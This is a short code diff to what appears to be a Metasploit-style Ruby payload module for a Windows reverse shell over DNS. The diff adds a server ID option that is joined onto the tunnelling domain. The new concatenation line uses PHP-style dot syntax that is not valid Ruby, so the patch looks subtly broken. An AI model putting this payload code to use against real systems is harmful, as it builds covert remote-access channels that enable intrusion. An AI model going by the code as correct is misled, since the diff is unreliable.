@@ -31,6 +31,7 @@ module Payload::Windows::ReverseDns
       ns_server:   ds['NS_SERVER'],
       domain:      ds['DOMAIN'],
       client_id:   '0', 
+      server_id:   ds['SERVER_ID'],
       retry_count: ds['ReverseConnectRetries'],
       reliable:    false
     }
@@ -102,7 +103,7 @@ module Payload::Windows::ReverseDns
   def asm_reverse_dns(opts={})
 
     retry_count  = [opts[:retry_count].to_i, 1000].max
-    domain       = opts[:domain]  
+    domain       = opts[:server_id].'.'.opts[:domain]  
     ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
     domain_length= domain.length + 18
     
